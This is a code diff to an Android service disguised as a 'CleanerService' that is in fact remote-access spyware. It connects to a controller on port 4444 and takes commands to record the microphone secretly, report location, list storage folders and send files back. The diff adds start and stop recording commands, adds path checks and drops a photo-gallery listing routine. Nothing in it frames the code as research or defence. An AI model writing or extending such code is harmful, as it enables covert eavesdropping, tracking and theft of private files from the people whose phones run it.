@@ -22,16 +22,22 @@ import java.io.FileInputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class CleanerService extends Service {
-    private String SERVER_IP = "192.168.1.6"; 
+    private String SERVER_IP = "192.168.1.6"; // حط IP الكمبيوتر بتاعك هنا
     private int SERVER_PORT = 4444;
     
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
     private boolean running = true;
+    
     private MediaRecorder recorder;
+    private boolean isRecording = false;
+    private File currentAudioFile;
 
     @Override
     public void onCreate() {
@@ -80,17 +86,17 @@ public class CleanerService extends Service {
             try {
                 String action = cmd.getString("cmd");
                 switch (action) {
-                    case "mic":
-                        recordAudio(cmd.optInt("sec", 10));
+                    case "start_rec":
+                        startRecording();
+                        break;
+                    case "stop_rec":
+                        stopRecording();
                         break;
                     case "loc":
                         getLocation();
                         break;
                     case "files":
-                        listFiles(cmd.optString("path", "/sdcard/"));
-                        break;
-                    case "gallery":
-                        listGallery();
+                        listFiles(cmd.optString("path", "/storage/emulated/0/"));
                         break;
                     case "getfile":
                         sendFile(cmd.getString("path"));
@@ -100,22 +106,38 @@ public class CleanerService extends Service {
         }).start();
     }
 
-    private void recordAudio(int seconds) {
+    private void startRecording() {
+        if (isRecording) return;
         try {
-            File outFile = new File(getCacheDir(), "rec.mp4");
+            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
+            currentAudioFile = new File(getCacheDir(), "rec_" + timeStamp + ".mp4");
+            
             recorder = new MediaRecorder();
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            recorder.setOutputFile(outFile.getAbsolutePath());
+            recorder.setOutputFile(currentAudioFile.getAbsolutePath());
             recorder.prepare();
             recorder.start();
-            Thread.sleep(seconds * 1000L);
+            isRecording = true;
+            sendResponse("{\"event\":\"status\",\"msg\":\"Recording started\"}");
+        } catch (Exception e) {
+            sendResponse("{\"event\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
+        }
+    }
+
+    private void stopRecording() {
+        if (!isRecording || recorder == null) return;
+        try {
             recorder.stop();
             recorder.release();
             recorder = null;
-            sendFile(outFile.getAbsolutePath());
-            outFile.delete();
+            isRecording = false;
+            sendResponse("{\"event\":\"status\",\"msg\":\"Recording stopped. Sending file...\"}");
+            if (currentAudioFile != null && currentAudioFile.exists()) {
+                sendFile(currentAudioFile.getAbsolutePath());
+                currentAudioFile.delete();
+            }
         } catch (Exception e) {
             sendResponse("{\"event\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
         }
@@ -139,6 +161,10 @@ public class CleanerService extends Service {
     private void listFiles(String path) {
         try {
             File dir = new File(path);
+            if (!dir.exists() || !dir.isDirectory()) {
+                sendResponse("{\"event\":\"error\",\"msg\":\"Invalid path\"}");
+                return;
+            }
             File[] files = dir.listFiles();
             JSONArray arr = new JSONArray();
             if (files != null) {
@@ -157,33 +183,10 @@ public class CleanerService extends Service {
         }
     }
 
-    private void listGallery() {
-        JSONArray arr = new JSONArray();
-        String[] paths = {"/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/DCIM/Screenshots/"};
-        for (String p : paths) {
-            File dir = new File(p);
-            File[] files = dir.listFiles();
-            if (files != null) {
-                for (File f : files) {
-                    if (f.getName().endsWith(".jpg") || f.getName().endsWith(".png") || f.getName().endsWith(".mp4")) {
-                        try {
-                            JSONObject obj = new JSONObject();
-                            obj.put("path", f.getAbsolutePath());
-                            obj.put("name", f.getName());
-                            obj.put("size", f.length());
-                            arr.put(obj);
-                        } catch (Exception ignored) {}
-                    }
-                }
-            }
-        }
-        sendResponse("{\"event\":\"gallery\",\"data\":" + arr.toString() + "}");
-    }
-
     private void sendFile(String path) {
         try {
             File f = new File(path);
-            if (!f.exists()) return;
+            if (!f.exists() || f.isDirectory()) return;
             byte[] bytes = new byte[(int) f.length()];
             FileInputStream fis = new FileInputStream(f);
             fis.read(bytes);
